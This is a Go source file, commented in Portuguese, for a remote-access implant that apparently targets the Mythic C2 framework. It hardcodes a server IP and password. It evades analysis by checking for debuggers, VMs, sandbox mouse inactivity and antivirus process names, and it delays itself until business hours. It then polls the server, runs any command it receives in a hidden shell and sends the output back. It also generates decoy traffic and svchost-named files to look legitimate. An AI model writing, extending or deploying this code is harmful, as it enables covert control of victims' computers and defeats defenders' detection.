package main

import (
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

// Configurações obfuscadas
const (
	mythicURL = "https://37.27.249.191:7443"
	mythicPwd = "sIUA14frSnPzB4umKe8c0ZKhIDf4a6"
	userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
	mutexName = "Global\\WinServiceHost32"
)

var (
	kernel32 = syscall.NewLazyDLL("kernel32.dll")
	user32   = syscall.NewLazyDLL("user32.dll")
	
	procIsDebuggerPresent = kernel32.NewProc("IsDebuggerPresent")
	procGetCursorPos      = user32.NewProc("GetCursorPos")
	procCreateMutexW      = kernel32.NewProc("CreateMutexW")
	procGetSystemMetrics  = user32.NewProc("GetSystemMetrics")
	procSetLastError      = kernel32.NewProc("SetLastError")
)

type AgentCheckin struct {
	Action    string                 `json:"action"`
	UUID      string                 `json:"uuid"`
	User      string                 `json:"user"`
	Host      string                 `json:"host"`
	PID       int                    `json:"pid"`
	OS        string                 `json:"os"`
	Timestamp string                 `json:"timestamp"`
	IPs       []string               `json:"ips"`
	Payload   map[string]interface{} `json:"payload_os"`
}

type AgentResponse struct {
	Action     string `json:"action"`
	TaskID     string `json:"task_id"`
	UserOutput string `json:"user_output"`
	Completed  bool   `json:"completed"`
}

type MousePoint struct {
	X, Y int32
}

// Função de detecção avançada de ambiente hostil
func DetectHostileEnvironment() bool {
	if runtime.GOOS != "windows" {
		return false
	}
	
	// Anti-debugging
	ret, _, _ := procIsDebuggerPresent.Call()
	if ret != 0 {
		return true
	}
	
	// Lista expandida de processos hostis
	hostileProcesses := []string{
		"ollydbg", "x64dbg", "windbg", "ida", "ida64", "wireshark", "tcpview",
		"regmon", "filemon", "procmon", "vmware", "virtualbox", "vbox", "qemu",
		"sandboxie", "cuckoo", "anubis", "threat", "joebox", "comodo", "sunbelt",
		"avp", "avast", "kaspersky", "norton", "mcafee", "malwarebytes", "defender",
		"processhacker", "processmonitor", "apimonitor", "regshot", "hiew",
	}
	
	for _, proc := range hostileProcesses {
		cmd := exec.Command("tasklist", "/FI", fmt.Sprintf("IMAGENAME eq %s.exe", proc))
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		if output, err := cmd.Output(); err == nil {
			if strings.Contains(strings.ToLower(string(output)), proc) {
				return true
			}
		}
	}
	
	// Detecção de VM via WMI
	cmd := exec.Command("wmic", "computersystem", "get", "manufacturer")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	if output, err := cmd.Output(); err == nil {
		manufacturer := strings.ToLower(string(output))
		vmStrings := []string{
			"vmware", "virtualbox", "vbox", "qemu", "xen", "parallels", 
			"microsoft corporation", "innotek", "oracle", "red hat",
		}
		for _, vm := range vmStrings {
			if strings.Contains(manufacturer, vm) {
				return true
			}
		}
	}
	
	// Verificar resolução de tela (sandboxes têm baixa resolução)
	width, _, _ := procGetSystemMetrics.Call(0)  // SM_CXSCREEN
	height, _, _ := procGetSystemMetrics.Call(1) // SM_CYSCREEN
	if width < 1024 || height < 768 {
		return true
	}
	
	// Verificar número de CPUs (VMs normalmente têm poucas)
	if runtime.NumCPU() < 2 {
		return true
	}
	
	return false
}

// Verificação avançada de atividade do usuário
func VerifyUserActivity() bool {
	var pos1, pos2, pos3 MousePoint
	
	// Primeira posição
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos1)))
	time.Sleep(200 * time.Millisecond)
	
	// Segunda posição
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos2)))
	time.Sleep(200 * time.Millisecond)
	
	// Terceira posição
	procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos3)))
	
	// Se o mouse não se moveu em duas verificações, pode ser sandbox
	if pos1.X == pos2.X && pos1.Y == pos2.Y && pos2.X == pos3.X && pos2.Y == pos3.Y {
		// Aguardar mais tempo e tentar novamente
		time.Sleep(3 * time.Second)
		var pos4 MousePoint
		procGetCursorPos.Call(uintptr(unsafe.Pointer(&pos4)))
		return pos3.X != pos4.X || pos3.Y != pos4.Y
	}
	
	return true
}

// Validação de horário comercial
func IsBusinessHours() bool {
	now := time.Now()
	hour := now.Hour()
	weekday := now.Weekday()
	
	// Só ativo durante dias úteis, horário comercial
	if weekday == time.Saturday || weekday == time.Sunday {
		return false
	}
	
	return hour >= 9 && hour <= 17
}

// Registro inicial no servidor Mythic
func RegisterWithMythic() error {
	hostname, _ := os.Hostname()
	uuid := fmt.Sprintf("%d-%s-%d", time.Now().Unix(), hostname, os.Getpid())
	
	payload := AgentCheckin{
		Action:    "checkin",
		UUID:      uuid,
		User:      os.Getenv("USERNAME"),
		Host:      hostname,
		PID:       os.Getpid(),
		OS:        runtime.GOOS,
		Timestamp: time.Now().Format(time.RFC3339),
		IPs:       []string{"127.0.0.1"},
		Payload: map[string]interface{}{
			"os":   runtime.GOOS,
			"arch": runtime.GOARCH,
		},
	}
	
	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Mythic", mythicPwd)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

// Buscar tarefas do servidor Mythic
func GetTasks() ([]map[string]interface{}, error) {
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("GET", mythicURL+"/api/v1.4/agent_message", nil)
	if err != nil {
		return nil, err
	}
	
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Mythic", mythicPwd)
	
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	
	var tasks []map[string]interface{}
	json.Unmarshal(body, &tasks)
	
	return tasks, nil
}

// Executar comando do sistema
func ExecuteCommand(command string) string {
	var cmd *exec.Cmd
	
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	
	output, err := cmd.Output()
	if err != nil {
		return fmt.Sprintf("Error: %s", err.Error())
	}
	
	return string(output)
}

// Enviar resultado para o servidor
func SendTaskResult(taskID, output string) error {
	response := AgentResponse{
		Action:     "post_response",
		TaskID:     taskID,
		UserOutput: base64.StdEncoding.EncodeToString([]byte(output)),
		Completed:  true,
	}
	
	jsonData, err := json.Marshal(response)
	if err != nil {
		return err
	}
	
	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 30 * time.Second,
	}
	
	req, err := http.NewRequest("POST", mythicURL+"/api/v1.4/agent_message", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", userAgent)
	req.Header.Set("Mythic", mythicPwd)
	
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	
	return nil
}

// Atividades para manter legitimidade
func MaintainLegitimacy() {
	go func() {
		rand.Seed(time.Now().UnixNano())
		
		for {
			// Sleep variável entre 5-15 minutos
			sleepTime := time.Duration(300+rand.Intn(600)) * time.Second
			time.Sleep(sleepTime)
			
			// Atividades legítimas aleatórias
			activities := []func(){
				func() {
					cmd := exec.Command("nslookup", "microsoft.com")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
				func() {
					cmd := exec.Command("ping", "-n", "1", "8.8.8.8")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
				func() {
					cmd := exec.Command("ipconfig", "/all")
					cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
					cmd.Run()
				},
				func() {
					tempFile := os.TempDir() + "\\svchost_" + strconv.Itoa(int(time.Now().Unix())) + ".tmp"
					if f, err := os.Create(tempFile); err == nil {
						f.Write([]byte("Windows Service Host temporary data"))
						f.Close()
						time.Sleep(5 * time.Second)
						os.Remove(tempFile)
					}
				},
			}
			
			if len(activities) > 0 {
				activities[rand.Intn(len(activities))]()
			}
		}
	}()
}

func main() {
	// Verificações críticas de evasão
	if DetectHostileEnvironment() {
		os.Exit(0)
	}
	
	// Verificar atividade do usuário
	if !VerifyUserActivity() {
		time.Sleep(15 * time.Second)
		if !VerifyUserActivity() {
			os.Exit(0)
		}
	}
	
	// Verificar horário comercial
	if !IsBusinessHours() {
		now := time.Now()
		nextBusiness := now
		
		// Calcular próximo horário comercial
		for nextBusiness.Weekday() == time.Saturday || 
			nextBusiness.Weekday() == time.Sunday || 
			nextBusiness.Hour() < 9 || 
			nextBusiness.Hour() >= 17 {
			nextBusiness = nextBusiness.Add(1 * time.Hour)
		}
		
		time.Sleep(nextBusiness.Sub(now))
	}
	
	// Criar mutex para instância única
	mutexNamePtr, _ := syscall.UTF16PtrFromString(mutexName)
	mutex, _, _ := procCreateMutexW.Call(0, 0, uintptr(unsafe.Pointer(mutexNamePtr)))
	if mutex == 0 {
		os.Exit(0)
	}
	
	// Iniciar atividades de legitimidade
	MaintainLegitimacy()
	
	// Aguardar um pouco antes do primeiro contato
	time.Sleep(time.Duration(30+rand.Intn(60)) * time.Second)
	
	// Registro inicial
	err := RegisterWithMythic()
	if err != nil {
		time.Sleep(time.Duration(60+rand.Intn(120)) * time.Second)
		os.Exit(0)
	}
	
	// Loop principal do agente
	rand.Seed(time.Now().UnixNano())
	
	for {
		tasks, err := GetTasks()
		if err == nil && len(tasks) > 0 {
			for _, task := range tasks {
				if taskID, ok := task["id"].(string); ok {
					if command, ok := task["command"].(string); ok {
						output := ExecuteCommand(command)
						SendTaskResult(taskID, output)
					}
				}
			}
		}
		
		// Jitter inteligente baseado em horário
		now := time.Now()
		var jitter time.Duration
		
		if now.Hour() >= 9 && now.Hour() <= 17 {
			// Horário comercial: mais ativo
			jitter = time.Duration(3+rand.Intn(7)) * time.Second
		} else {
			// Fora do horário: menos ativo
			jitter = time.Duration(10+rand.Intn(20)) * time.Second
		}
		
		time.Sleep(jitter)
	}
}